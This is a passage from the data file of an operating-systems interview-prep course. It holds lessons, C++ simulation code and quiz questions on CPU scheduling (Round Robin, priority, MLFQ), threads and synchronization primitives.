
        if (!procs[i].started) {
            procs[i].responseTime = currentTime - procs[i].arrival;
            procs[i].started = true;
        }

        int execTime = min(quantum, procs[i].remaining);
        cout << "P" << procs[i].id << "(" << currentTime << "-"
             << currentTime + execTime << ") ";
        currentTime += execTime;
        procs[i].remaining -= execTime;

        // Add newly arrived processes to ready queue
        while (idx < n && procs[idx].arrival <= currentTime) {
            readyQ.push(idx); idx++;
        }

        if (procs[i].remaining > 0) {
            readyQ.push(i); // Put back in queue
        } else {
            procs[i].completion = currentTime;
            procs[i].turnaround = procs[i].completion - procs[i].arrival;
            procs[i].waiting = procs[i].turnaround - procs[i].burst;
            totalWT += procs[i].waiting;
            totalTAT += procs[i].turnaround;
            completed++;
        }
    }

    cout << endl;
    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT\\tRT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.completion << "\\t" << p.turnaround
             << "\\t" << p.waiting << "\\t" << p.responseTime << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT=" << totalTAT/n << ", Avg WT=" << totalWT/n << endl;
}

// Priority Scheduling (Non-Preemptive, lower number = higher priority)
void priorityScheduling(vector<Process> procs) {
    int n = procs.size();
    vector<bool> done(n, false);
    int currentTime = 0, completed = 0;
    double totalWT = 0, totalTAT = 0;

    cout << "\\n=== Priority Scheduling (Non-Preemptive) ===" << endl;

    while (completed < n) {
        int idx = -1, highestPri = INT_MAX;
        for (int i = 0; i < n; i++) {
            if (!done[i] && procs[i].arrival <= currentTime
                && procs[i].priority < highestPri) {
                highestPri = procs[i].priority;
                idx = i;
            }
        }
        if (idx == -1) { currentTime++; continue; }

        procs[idx].completion = currentTime + procs[idx].burst;
        procs[idx].turnaround = procs[idx].completion - procs[idx].arrival;
        procs[idx].waiting = procs[idx].turnaround - procs[idx].burst;
        currentTime = procs[idx].completion;
        totalWT += procs[idx].waiting;
        totalTAT += procs[idx].turnaround;
        done[idx] = true;
        completed++;
    }

    cout << "PID\\tAT\\tBT\\tPri\\tCT\\tTAT\\tWT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.priority << "\\t" << p.completion
             << "\\t" << p.turnaround << "\\t" << p.waiting << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT=" << totalTAT/n << ", Avg WT=" << totalWT/n << endl;
}

int main() {
    vector<Process> procs = {
        {1, 0, 10, 3, 0,0,0,0,0,false},
        {2, 1, 4,  1, 0,0,0,0,0,false},
        {3, 2, 5,  4, 0,0,0,0,0,false},
        {4, 3, 2,  2, 0,0,0,0,0,false}
    };
    roundRobin(procs, 4);
    priorityScheduling(procs);
    return 0;
}`,
          problems: [
            ['Round Robin Scheduling', 'https://www.geeksforgeeks.org/program-for-round-robin-scheduling-for-the-same-arrival-time/', 'Medium'],
            ['Priority Scheduling', 'https://www.geeksforgeeks.org/program-for-priority-cpu-scheduling-set-1/', 'Medium'],
            ['Preemptive Priority Scheduling', 'https://www.geeksforgeeks.org/preemptive-priority-cpu-scheduling-algortithm/', 'Hard'],
          ],
          mcqs: [
            {q: 'If the time quantum in Round Robin is set very large, it behaves like:', o: ['SJF', 'FCFS', 'Priority Scheduling', 'SRTF'], a: 1},
            {q: 'What technique is used to prevent starvation in priority scheduling?', o: ['Aging', 'Paging', 'Swapping', 'Thrashing'], a: 0},
            {q: 'Which scheduling algorithm provides the best average response time for interactive systems?', o: ['FCFS', 'SJF', 'Round Robin', 'Priority (Non-Preemptive)'], a: 2},
          ],
        },
        // ----- Topic 2: MLFQ & Comparison of Algorithms -----
        {
          t: 'MLFQ & Comparison of Algorithms',
          learn: '<div class="learn-section"><div class="learn-h">Multilevel Queue Scheduling</div><p class="learn-p">In <b>Multilevel Queue Scheduling</b>, the ready queue is partitioned into several separate queues, each with its own scheduling algorithm. Processes are permanently assigned to one queue based on their type (e.g., foreground/interactive vs. background/batch).</p><p class="learn-p">Common configuration:</p><ul class="learn-list"><li><b>Queue 1 (Highest Priority):</b> System processes &mdash; FCFS or Priority</li><li><b>Queue 2:</b> Interactive processes &mdash; Round Robin</li><li><b>Queue 3 (Lowest Priority):</b> Batch processes &mdash; FCFS</li></ul><p class="learn-p">Scheduling between queues is typically <b>fixed priority preemptive</b>: a process in a lower-priority queue will only run if all higher-priority queues are empty. Alternatively, <b>time slicing</b> can be used: each queue gets a certain percentage of CPU time (e.g., 80% to foreground, 20% to background).</p><div class="learn-warn"><b>Warning:</b> In simple multilevel queue scheduling, a process cannot move between queues. This means an I/O-bound process that becomes CPU-bound is stuck in its original queue. This inflexibility is addressed by MLFQ.</div></div><div class="learn-section"><div class="learn-h">Multilevel Feedback Queue (MLFQ)</div><p class="learn-p"><b>MLFQ</b> is the most general and sophisticated CPU scheduling algorithm. Unlike the multilevel queue, processes can <b>move between queues</b> based on their behavior. The key rules are:</p><ol class="learn-list"><li><b>Rule 1:</b> If Priority(A) &gt; Priority(B), A runs.</li><li><b>Rule 2:</b> If Priority(A) = Priority(B), A and B run in Round Robin.</li><li><b>Rule 3:</b> When a new job enters the system, it is placed at the <b>highest priority</b> queue.</li><li><b>Rule 4a:</b> If a job uses up its entire time quantum, its priority is <b>reduced</b> (moved to a lower queue).</li><li><b>Rule 4b:</b> If a job gives up the CPU before the time quantum expires (e.g., for I/O), it stays at the <b>same priority level</b>.</li><li><b>Rule 5 (Priority Boost):</b> Periodically, move all jobs to the highest priority queue to prevent starvation.</li></ol><div class="learn-tip"><b>Tip:</b> MLFQ favors interactive (I/O-bound) processes because they frequently give up the CPU before their quantum expires and thus stay in high-priority queues. CPU-bound processes naturally sink to lower-priority queues.</div><p class="learn-p"><b>Typical MLFQ configuration:</b></p><table class="learn-table"><tr><th>Queue</th><th>Priority</th><th>Time Quantum</th><th>Algorithm</th></tr><tr><td>Q0</td><td>Highest</td><td>8 ms</td><td>Round Robin</td></tr><tr><td>Q1</td><td>Medium</td><td>16 ms</td><td>Round Robin</td></tr><tr><td>Q2</td><td>Lowest</td><td>&infin;</td><td>FCFS</td></tr></table><p class="learn-p">A new process enters Q0. If it doesn\'t finish within 8ms, it moves to Q1. If it doesn\'t finish within 16ms in Q1, it moves to Q2.</p></div><div class="learn-section"><div class="learn-h">Gaming the MLFQ</div><p class="learn-p">A malicious process could <b>game the scheduler</b> by issuing a fake I/O request just before its time quantum expires, thereby staying at a high priority. The <b>solution</b>: instead of resetting the time quota when a process gives up the CPU, <b>accumulate</b> the time used. Once a process has used its total allotment at a given level, demote it regardless of how many times it gave up the CPU.</p></div><div class="learn-section"><div class="learn-h">Comparison of All Scheduling Algorithms</div><table class="learn-table"><tr><th>Algorithm</th><th>Preemptive?</th><th>Starvation?</th><th>Optimal WT?</th><th>Best For</th></tr><tr><td>FCFS</td><td>No</td><td>No</td><td>No</td><td>Batch systems</td></tr><tr><td>SJF</td><td>No</td><td>Yes</td><td>Yes (non-preemptive)</td><td>Batch with known burst times</td></tr><tr><td>SRTF</td><td>Yes</td><td>Yes</td><td>Yes (overall)</td><td>Minimal avg. wait time</td></tr><tr><td>Round Robin</td><td>Yes</td><td>No</td><td>No</td><td>Interactive/time-sharing</td></tr><tr><td>Priority</td><td>Both</td><td>Yes</td><td>No</td><td>Systems with task importance</td></tr><tr><td>MLFQ</td><td>Yes</td><td>No (with boost)</td><td>Approximates</td><td>General-purpose OS</td></tr></table></div><div class="learn-section"><div class="learn-h">Real-World Schedulers</div><p class="learn-p">Modern operating systems use sophisticated schedulers:</p><ul class="learn-list"><li><b>Linux CFS (Completely Fair Scheduler):</b> Uses a red-black tree to maintain processes sorted by virtual runtime. Aims to give each process a fair share of CPU. Time complexity: <span class="learn-complexity">O(log n)</span> for picking the next process.</li><li><b>Windows:</b> Uses a multilevel feedback queue with 32 priority levels (0&ndash;31). Threads in the same priority level are scheduled round-robin.</li><li><b>macOS/iOS:</b> Based on Mach scheduler with multilevel feedback queues and priority decay.</li></ul><div class="learn-tip"><b>Tip:</b> In DE Shaw interviews, being able to discuss real-world schedulers (especially Linux CFS) and how they approximate MLFQ shows depth of understanding.</div></div>',
          code: `// Multilevel Feedback Queue (MLFQ) Simulation in C++
#include <iostream>
#include <vector>
#include <queue>
#include <algorithm>
using namespace std;

struct Process {
    int id, arrival, totalBurst;
    int remaining;
    int currentQueue;    // Which queue the process is in
    int timeUsedInQueue; // Time used at current priority level
    int completion;
};

// MLFQ with 3 queues: Q0(q=4), Q1(q=8), Q2(FCFS)
void mlfq(vector<Process> procs) {
    int n = procs.size();
    int quanta[] = {4, 8, 999999}; // Q0, Q1, Q2 (FCFS = huge quantum)
    int numQueues = 3;

    sort(procs.begin(), procs.end(), [](const Process &a, const Process &b) {
        return a.arrival < b.arrival;
    });

    for (auto &p : procs) {
        p.remaining = p.totalBurst;
        p.currentQueue = 0;
        p.timeUsedInQueue = 0;
        p.completion = 0;
    }

    // Three ready queues
    queue<int> Q[3];
    int currentTime = 0, completed = 0, nextArrival = 0;

    cout << "=== MLFQ Scheduling (Q0:q=4, Q1:q=8, Q2:FCFS) ===" << endl;
    cout << "Execution trace:" << endl;

    while (completed < n) {
        // Add newly arrived processes to Q0
        while (nextArrival < n && procs[nextArrival].arrival <= currentTime) {
            Q[0].push(nextArrival);
            procs[nextArrival].currentQueue = 0;
            nextArrival++;
        }

        // Find highest priority non-empty queue
        int qIdx = -1;
        for (int q = 0; q < numQueues; q++) {
            if (!Q[q].empty()) { qIdx = q; break; }
        }

        if (qIdx == -1) {
            // No process ready, advance time
            if (nextArrival < n) currentTime = procs[nextArrival].arrival;
            continue;
        }

        int i = Q[qIdx].front();
        Q[qIdx].pop();

        int quantum = quanta[qIdx];
        int execTime = min(quantum, procs[i].remaining);

        cout << "  t=" << currentTime << ": P" << procs[i].id
             << " runs from Q" << qIdx << " for " << execTime
             << "ms (remaining after: " << procs[i].remaining - execTime
             << ")" << endl;

        currentTime += execTime;
        procs[i].remaining -= execTime;

        // Add newly arrived processes (they arrived during execution)
        while (nextArrival < n && procs[nextArrival].arrival <= currentTime) {
            Q[0].push(nextArrival);
            procs[nextArrival].currentQueue = 0;
            nextArrival++;
        }

        if (procs[i].remaining == 0) {
            procs[i].completion = currentTime;
            completed++;
            cout << "    -> P" << procs[i].id << " completed at t="
                 << currentTime << endl;
        } else if (qIdx < numQueues - 1) {
            // Demote to next lower queue
            procs[i].currentQueue = qIdx + 1;
            Q[qIdx + 1].push(i);
            cout << "    -> P" << procs[i].id << " demoted to Q"
                 << qIdx + 1 << endl;
        } else {
            // Already in lowest queue, stay
            Q[qIdx].push(i);
        }
    }

    cout << "\\nResults:" << endl;
    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT" << endl;
    double totalTAT = 0, totalWT = 0;
    for (auto &p : procs) {
        int tat = p.completion - p.arrival;
        int wt = tat - p.totalBurst;
        totalTAT += tat; totalWT += wt;
        cout << "P" << p.id << "\\t" << p.arrival << "\\t"
             << p.totalBurst << "\\t" << p.completion << "\\t"
             << tat << "\\t" << wt << endl;
    }
    cout << "Avg TAT=" << totalTAT/n << ", Avg WT=" << totalWT/n << endl;
}

int main() {
    vector<Process> procs = {
        {1, 0, 20, 0, 0, 0, 0},
        {2, 0,  5, 0, 0, 0, 0},
        {3, 2,  8, 0, 0, 0, 0},
        {4, 5,  3, 0, 0, 0, 0}
    };
    mlfq(procs);
    return 0;
}`,
          problems: [
            ['MLFQ Scheduling', 'https://www.geeksforgeeks.org/multilevel-feedback-queue-scheduling-mlfq-cpu-scheduling/', 'Hard'],
            ['Multilevel Queue Scheduling', 'https://www.geeksforgeeks.org/multilevel-queue-mlq-cpu-scheduling/', 'Medium'],
            ['Comparison of CPU Scheduling Algorithms', 'https://www.geeksforgeeks.org/cpu-scheduling-in-operating-systems/', 'Easy'],
          ],
          mcqs: [
            {q: 'In a typical MLFQ, what happens to a process that uses its entire time quantum?', o: ['It stays in the same queue', 'It is moved to a higher priority queue', 'It is moved to a lower priority queue', 'It is terminated'], a: 2},
            {q: 'What mechanism prevents starvation in MLFQ?', o: ['Aging within queues', 'Periodic priority boost', 'Round Robin at each level', 'Using SJF in the lowest queue'], a: 1},
            {q: 'The Linux Completely Fair Scheduler (CFS) uses which data structure to manage processes?', o: ['Hash table', 'Linked list', 'Red-black tree', 'Min-heap'], a: 2},
          ],
        },
      ],
    },

    // ===== TAB: THREADS =====
    {
      id: 'threads', t: 'Threads',
      topics: [
        // ----- Topic 0: Threads & Multithreading Models -----
        {
          t: 'Threads & Multithreading Models',
          learn: '<div class="learn-section"><div class="learn-h">What is a Thread?</div><p class="learn-p">A <b>thread</b> is the smallest unit of CPU execution. It is a lightweight process that shares the same address space as other threads within the same process. Each thread has its own:</p><ul class="learn-list"><li><b>Thread ID</b></li><li><b>Program Counter (PC)</b></li><li><b>Register set</b></li><li><b>Stack</b></li></ul><p class="learn-p">Threads within the same process <b>share</b>:</p><ul class="learn-list"><li>Code section (text segment)</li><li>Data section (global variables)</li><li>Open files and signals</li><li>Heap memory</li></ul><div class="learn-tip"><b>Tip:</b> The key interview distinction: processes have separate address spaces; threads share the same address space. This makes thread creation, context switching, and communication much cheaper than for processes.</div></div><div class="learn-section"><div class="learn-h">Benefits of Multithreading</div><p class="learn-p">There are four major categories of benefits:</p><ol class="learn-list"><li><b>Responsiveness:</b> A multithreaded application can continue to respond to user input even when one thread is performing a lengthy operation (e.g., a web browser rendering one page while fetching another).</li><li><b>Resource Sharing:</b> Threads share the address space and resources of their process, which is more efficient than inter-process communication.</li><li><b>Economy:</b> Thread creation is ~30x faster than process creation. Context switching between threads is ~5x faster because there\'s no need to switch address spaces or flush the TLB.</li><li><b>Scalability:</b> Threads can run in parallel on multicore systems, achieving true parallelism.</li></ol></div><div class="learn-section"><div class="learn-h">User-Level Threads vs. Kernel-Level Threads</div><table class="learn-table"><tr><th>Feature</th><th>User-Level Threads (ULT)</th><th>Kernel-Level Threads (KLT)</th></tr><tr><td>Managed by</td><td>User-space thread library</td><td>Operating system kernel</td></tr><tr><td>Kernel awareness</td><td>Kernel is unaware of threads</td><td>Kernel manages each thread</td></tr><tr><td>Context switch</td><td>Very fast (no kernel involvement)</td><td>Slower (requires kernel mode switch)</td></tr><tr><td>Blocking</td><td>If one thread blocks, ALL threads in the process block</td><td>Only the blocking thread is affected</td></tr><tr><td>Multicore utilization</td><td>Cannot use multiple cores (kernel sees one thread)</td><td>Can run on different cores in parallel</td></tr><tr><td>Examples</td><td>GNU Portable Threads, Green Threads</td><td>Windows threads, Linux pthreads (NPTL)</td></tr></table><div class="learn-warn"><b>Warning:</b> The biggest disadvantage of pure user-level threads is that a blocking system call blocks the entire process, since the kernel only sees one thread of execution.</div></div><div class="learn-section"><div class="learn-h">Multithreading Models</div><p class="learn-p">The relationship between user-level threads and kernel-level threads is established through one of three models:</p><div class="learn-h">1. Many-to-One Model</div><p class="learn-p">Many user-level threads are mapped to a <b>single kernel thread</b>. Thread management is done in user space, making it efficient. However:</p><ul class="learn-list"><li>If one thread makes a blocking call, the entire process blocks.</li><li>Cannot exploit multicore parallelism.</li><li>Example: Solaris Green Threads, GNU Portable Threads.</li></ul><div class="learn-h">2. One-to-One Model</div><p class="learn-p">Each user-level thread maps to a <b>separate kernel thread</b>. This provides more concurrency than many-to-one:</p><ul class="learn-list"><li>One thread blocking does not block others.</li><li>Multiple threads can run in parallel on multicore systems.</li><li>Overhead: creating a user thread requires creating a corresponding kernel thread, which can be expensive.</li><li>Example: <b>Linux (NPTL)</b>, Windows threads.</li></ul><div class="learn-h">3. Many-to-Many Model</div><p class="learn-p">Many user-level threads are multiplexed over a <b>smaller or equal number</b> of kernel threads. This provides the best of both worlds:</p><ul class="learn-list"><li>True concurrency (threads can run on different cores).</li><li>No blocking of entire process.</li><li>User can create as many threads as needed without overwhelming the kernel.</li><li>More complex to implement.</li><li>Example: Solaris prior to version 9, Windows ThreadFiber package.</li></ul><div class="learn-tip"><b>Tip:</b> Modern systems (Linux, Windows, macOS) predominantly use the <b>one-to-one model</b> because kernel thread creation has become efficient enough, and the simplicity of the model outweighs the overhead.</div></div><div class="learn-section"><div class="learn-h">POSIX Threads (pthreads)</div><p class="learn-p"><b>pthreads</b> is the standard API for creating and managing threads in Unix/Linux. Key functions:</p><div class="learn-code">pthread_create(&amp;tid, &amp;attr, function, arg); // Create thread\npthread_join(tid, &amp;retval);                  // Wait for thread\npthread_exit(retval);                        // Thread exits\npthread_mutex_lock(&amp;mutex);                  // Lock mutex\npthread_mutex_unlock(&amp;mutex);                // Unlock mutex</div></div><div class="learn-section"><div class="learn-h">Thread Pools</div><p class="learn-p">A <b>thread pool</b> creates a number of threads at startup and keeps them waiting for work. When a request arrives, a thread from the pool handles it, then returns to the pool. Benefits:</p><ul class="learn-list"><li>Faster to service a request with an existing thread than to create a new one.</li><li>Limits the total number of threads, preventing system resource exhaustion.</li><li>Separates the mechanism of creating the task from its execution.</li></ul><p class="learn-p">Thread pools are used extensively in web servers (e.g., Apache, Tomcat), database connection pooling, and the Java <code>ExecutorService</code>.</p></div>',
          code: `// Multithreading Demo in C++ using pthreads
#include <iostream>
#include <pthread.h>
#include <unistd.h>
#include <vector>
using namespace std;

// Shared data between threads
int sharedCounter = 0;
pthread_mutex_t counterMutex = PTHREAD_MUTEX_INITIALIZER;

// Thread function: increments shared counter safely
void* incrementCounter(void* arg) {
    int threadId = *(int*)arg;
    for (int i = 0; i < 100000; i++) {
        pthread_mutex_lock(&counterMutex);
        sharedCounter++;
        pthread_mutex_unlock(&counterMutex);
    }
    cout << "Thread " << threadId << " finished incrementing." << endl;
    return NULL;
}

// Thread function: simulates I/O-bound work
void* ioBoundWork(void* arg) {
    int threadId = *(int*)arg;
    cout << "Thread " << threadId << " starting I/O work..." << endl;
    usleep(500000); // Simulate 500ms I/O
    cout << "Thread " << threadId << " I/O complete." << endl;
    return NULL;
}

// Simple thread pool simulation
struct Task {
    int taskId;
    void (*function)(int);
};

void processTask(int taskId) {
    cout << "  Processing task " << taskId
         << " on thread " << pthread_self() << endl;
    usleep(100000); // Simulate work
}

void* workerThread(void* arg) {
    // In a real pool, this would loop and pick tasks from a queue
    Task* task = (Task*)arg;
    task->function(task->taskId);
    return NULL;
}

int main() {
    // Demo 1: Multiple threads sharing data with mutex
    cout << "=== Shared Counter Demo ===" << endl;
    const int NUM_THREADS = 4;
    pthread_t threads[NUM_THREADS];
    int threadIds[NUM_THREADS];

    for (int i = 0; i < NUM_THREADS; i++) {
        threadIds[i] = i;
        pthread_create(&threads[i], NULL, incrementCounter, &threadIds[i]);
    }
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    cout << "Final counter value: " << sharedCounter
         << " (expected: " << NUM_THREADS * 100000 << ")" << endl;

    // Demo 2: Thread pool simulation
    cout << "\\n=== Thread Pool Simulation ===" << endl;
    const int POOL_SIZE = 3;
    const int NUM_TASKS = 6;
    pthread_t pool[POOL_SIZE];
    Task tasks[NUM_TASKS];

    for (int i = 0; i < NUM_TASKS; i++) {
        tasks[i] = {i, processTask};
    }

    // Process tasks in batches of POOL_SIZE
    for (int batch = 0; batch < NUM_TASKS; batch += POOL_SIZE) {
        int batchSize = min(POOL_SIZE, NUM_TASKS - batch);
        cout << "Batch starting at task " << batch << ":" << endl;
        for (int i = 0; i < batchSize; i++) {
            pthread_create(&pool[i], NULL, workerThread, &tasks[batch + i]);
        }
        for (int i = 0; i < batchSize; i++) {
            pthread_join(pool[i], NULL);
        }
    }

    pthread_mutex_destroy(&counterMutex);
    cout << "\\nAll demos complete." << endl;
    return 0;
}`,
          problems: [
            ['Thread vs Process Differences', 'https://www.geeksforgeeks.org/difference-between-process-and-thread/', 'Easy'],
            ['Multithreading Models', 'https://www.geeksforgeeks.org/multi-threading-models-in-process-management/', 'Medium'],
            ['Print FooBar Alternately (LeetCode 1115)', 'https://leetcode.com/problems/print-foobar-alternately/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT shared between threads of the same process?', o: ['Code section', 'Global variables', 'Stack', 'Open file descriptors'], a: 2},
            {q: 'In the many-to-one threading model, what happens when one thread makes a blocking system call?', o: ['Only that thread blocks', 'All threads in the process block', 'The kernel creates a new thread', 'The call is converted to non-blocking'], a: 1},
            {q: 'Which threading model is used by modern Linux (NPTL)?', o: ['Many-to-One', 'One-to-One', 'Many-to-Many', 'Two-level'], a: 1},
          ],
        },
      ],
    },

    // ===== TAB: SYNCHRONIZATION =====
    {
      id: 'sync', t: 'Synchronization',
      topics: [
        // ----- Topic 0: Mutex, Semaphores & Monitors -----
        {
          t: 'Mutex, Semaphores & Monitors',
          learn: '<div class="learn-section"><div class="learn-h">The Critical Section Problem</div><p class="learn-p">When multiple processes or threads access <b>shared data concurrently</b>, the outcome depends on the order of execution &mdash; this is called a <b>race condition</b>. The segment of code where shared data is accessed is called the <b>critical section</b>.</p><p class="learn-p">A solution to the critical section problem must satisfy three conditions:</p><ol class="learn-list"><li><b>Mutual Exclusion:</b> If process P<sub>i</sub> is executing in its critical section, no other process can be in its critical section.</li><li><b>Progress:</b> If no process is in the critical section and some processes wish to enter, only those processes not in their remainder section can participate in the decision, and the decision cannot be postponed indefinitely.</li><li><b>Bounded Waiting:</b> There exists a bound on the number of times other processes can enter their critical sections after a process has requested entry and before that request is granted.</li></ol></div><div class="learn-section"><div class="learn-h">Mutex (Mutual Exclusion Lock)</div><p class="learn-p">A <b>mutex</b> is the simplest synchronization tool. It is a lock that a thread must acquire before entering a critical section and release when leaving. Only <b>one thread</b> can hold the mutex at a time.</p><div class="learn-code">pthread_mutex_t lock;\npthread_mutex_init(&amp;lock, NULL);\n\n// Thread code:\npthread_mutex_lock(&amp;lock);    // Acquire (blocks if locked)\n// ... critical section ...\npthread_mutex_unlock(&amp;lock);  // Release</div><p class="learn-p">Key properties:</p><ul class="learn-list"><li><b>Binary:</b> Only two states &mdash; locked or unlocked.</li><li><b>Ownership:</b> Only the thread that locked the mutex can unlock it.</li><li><b>Blocking:</b> If a thread tries to lock an already-locked mutex, it is put to sleep (blocked) until the mutex is released.</li></ul><div class="learn-tip"><b>Tip:</b> A <b>spinlock</b> is a variant of mutex where the waiting thread <b>busy-waits</b> (spins in a loop) instead of blocking. Spinlocks are useful on multicore systems for very short critical sections because the overhead of sleeping and waking is avoided.</div></div><div class="learn-section"><div class="learn-h">Semaphores</div><p class="learn-p">A <b>semaphore</b> is a more general synchronization tool introduced by Dijkstra. It is an integer variable accessed only through two atomic operations:</p><ul class="learn-list"><li><b>wait(S)</b> (also called <b>P()</b> or <b>down()</b>): Decrement S. If S &lt; 0, block the calling process.</li><li><b>signal(S)</b> (also called <b>V()</b> or <b>up()</b>): Increment S. If S &le; 0, wake up a blocked process.</li></ul><div class="learn-code">// Pseudocode for semaphore operations\nwait(S) {\n    S--;\n    if (S &lt; 0) {\n        // Add this process to the waiting queue\n        block();\n    }\n}\n\nsignal(S) {\n    S++;\n    if (S &lt;= 0) {\n        // Remove a process from the waiting queue\n        wakeup(P);\n    }\n}</div><p class="learn-p"><b>Two types of semaphores:</b></p><table class="learn-table"><tr><th>Type</th><th>Initial Value</th><th>Purpose</th></tr><tr><td>Binary Semaphore</td><td>0 or 1</td><td>Mutual exclusion (similar to mutex)</td></tr><tr><td>Counting Semaphore</td><td>N (any non-negative integer)</td><td>Control access to a resource with N instances</td></tr></table><div class="learn-warn"><b>Warning:</b> A binary semaphore is <b>not identical</b> to a mutex! Key differences: (1) A semaphore has no concept of ownership &mdash; any thread can signal, not just the one that waited. (2) A semaphore can be used for <b>signaling</b> (one thread signals another), while a mutex is strictly for mutual exclusion.</div></div><div class="learn-section"><div class="learn-h">Semaphore Use Cases</div><p class="learn-p"><b>1. Mutual Exclusion:</b></p><div class="learn-code">semaphore mutex = 1;\n\nwait(mutex);\n// critical section\nsignal(mutex);</div><p class="learn-p"><b>2. Ordering/Signaling:</b> Ensure statement S2 in process P2 executes after S1 in P1:</p><div class="learn-code">semaphore sync = 0;\n\n// Process P1:        // Process P2:\nS1;                   wait(sync);\nsignal(sync);         S2;</div><p class="learn-p"><b>3. Resource Counting:</b> Control access to a pool of N identical resources:</p><div class="learn-code">semaphore pool = N;  // N available resources\n\nwait(pool);          // Acquire a resource\n// use resource\nsignal(pool);        // Release resource</div></div><div class="learn-section"><div class="learn-h">Monitors</div><p class="learn-p">A <b>monitor</b> is a high-level synchronization construct that encapsulates shared data, operations on that data, and synchronization into a single module. Only <b>one process can be active inside the monitor at a time</b> &mdash; mutual exclusion is guaranteed by the compiler/language runtime.</p><p class="learn-p">Monitors use <b>condition variables</b> for synchronization beyond mutual exclusion. A condition variable supports two operations:</p><ul class="learn-list"><li><b>wait(c):</b> The calling process is suspended and placed on the waiting queue for condition c. The monitor lock is released.</li><li><b>signal(c):</b> Resumes one process waiting on condition c. If no process is waiting, the signal has no effect (unlike semaphores where the value is incremented).</li></ul><p class="learn-p"><b>Hoare vs. Mesa Monitors:</b></p><table class="learn-table"><tr><th>Hoare Monitor</th><th>Mesa Monitor</th></tr><tr><td>signal() immediately switches to the woken process</td><td>signal() places the woken process in the ready queue; signaler continues</td></tr><tr><td>Woken process runs next</td><td>Woken process must recheck the condition (use while loop)</td></tr><tr><td>Stronger guarantee but harder to implement</td><td>Simpler to implement; used in Java, pthreads</td></tr></table><div class="learn-tip"><b>Tip:</b> In Java, every object is a monitor. The <code>synchronized</code> keyword provides mutual exclusion, and <code>wait()</code>/<code>notify()</code>/<code>notifyAll()</code> provide condition variable functionality. Always use <code>while</code> loops (not <code>if</code>) when checking conditions because of Mesa semantics.</div></div>',
          code: `// Synchronization Primitives Demo in C++ (pthreads)
#include <iostream>
#include <pthread.h>
#include <semaphore.h>
#include <unistd.h>
using namespace std;

// ============ MUTEX DEMO ============
pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
int bankBalance = 1000;

void* withdraw(void* arg) {
    int amount = *(int*)arg;
    pthread_mutex_lock(&mtx);
    // Critical section
    if (bankBalance >= amount) {
        usleep(1000); // Simulate processing
        bankBalance -= amount;
        cout << "Withdrew " << amount << ", Balance: " << bankBalance << endl;
    } else {
        cout << "Insufficient funds for " << amount << endl;
    }
    pthread_mutex_unlock(&mtx);
    return NULL;
}

// ============ SEMAPHORE DEMO ============
// Simulates a parking lot with limited spots
sem_t parkingSpots;
const int MAX_SPOTS = 3;

void* parkCar(void* arg) {
    int carId = *(int*)arg;
    cout << "Car " << carId << " waiting for a spot..." << endl;
    sem_wait(&parkingSpots);  // Acquire a spot (counting semaphore)
    cout << "Car " << carId << " parked!" << endl;
    usleep(500000); // Simulate parking duration
    cout << "Car " << carId << " leaving." << endl;
    sem_post(&parkingSpots);  // Release the spot
    return NULL;
}

// ============ ORDERING WITH SEMAPHORE ============
sem_t orderSem;

void* firstTask(void* arg) {
    cout << "First task executing..." << endl;
    usleep(200000); // Simulate work
    cout << "First task done. Signaling second task." << endl;
    sem_post(&orderSem); // Signal that first task is done
    return NULL;
}

void* secondTask(void* arg) {
    sem_wait(&orderSem); // Wait for first task to finish
    cout << "Second task executing (guaranteed after first)." << endl;
    return NULL;
}

int main() {
    // --- Mutex Demo ---
    cout << "=== Mutex Demo (Bank Withdrawals) ===" << endl;
    pthread_t t1, t2;
    int amt1 = 700, amt2 = 500;
    pthread_create(&t1, NULL, withdraw, &amt1);
    pthread_create(&t2, NULL, withdraw, &amt2);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    cout << "Final Balance: " << bankBalance << endl;

    // --- Counting Semaphore Demo ---
    cout << "\\n=== Counting Semaphore (Parking Lot) ===" << endl;
    sem_init(&parkingSpots, 0, MAX_SPOTS);
    const int NUM_CARS = 6;
    pthread_t cars[NUM_CARS];
    int carIds[NUM_CARS];
    for (int i = 0; i < NUM_CARS; i++) {
        carIds[i] = i + 1;
        pthread_create(&cars[i], NULL, parkCar, &carIds[i]);
    }
    for (int i = 0; i < NUM_CARS; i++) {
        pthread_join(cars[i], NULL);
    }
    sem_destroy(&parkingSpots);

    // --- Ordering Demo ---
    cout << "\\n=== Semaphore Ordering Demo ===" << endl;
    sem_init(&orderSem, 0, 0);
    pthread_t tf, ts;
    pthread_create(&ts, NULL, secondTask, NULL); // Start second first
    pthread_create(&tf, NULL, firstTask, NULL);
    pthread_join(tf, NULL);
    pthread_join(ts, NULL);
    sem_destroy(&orderSem);

    pthread_mutex_destroy(&mtx);
    return 0;
}`,
          problems: [
            ['Mutex vs Semaphore', 'https://www.geeksforgeeks.org/mutex-vs-semaphore/', 'Easy'],
            ['Print in Order (LeetCode 1114)', 'https://leetcode.com/problems/print-in-order/', 'Easy'],
            ['Building H2O (LeetCode 1117)', 'https://leetcode.com/problems/building-h2o/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT a requirement for a correct critical section solution?', o: ['Mutual Exclusion', 'Progress', 'Bounded Waiting', 'Fairness'], a: 3},
            {q: 'What is the key difference between a binary semaphore and a mutex?', o: ['Binary semaphore can only be 0 or 1', 'Mutex has ownership semantics; any thread can signal a semaphore', 'They are identical in every way', 'Mutex can count above 1'], a: 1},
            {q: 'In Mesa-style monitors, why must the condition be checked in a while loop instead of an if statement?', o: ['Because signal() does not guarantee the woken thread runs next', 'Because the monitor may have multiple entry points', 'Because the compiler requires it', 'Because if statements cannot be used inside monitors'], a: 0},
          ],
        },
        // ----- Topic 1: Classical Synchronization Problems -----
        {
          t: 'Classical Synchronization Problems',
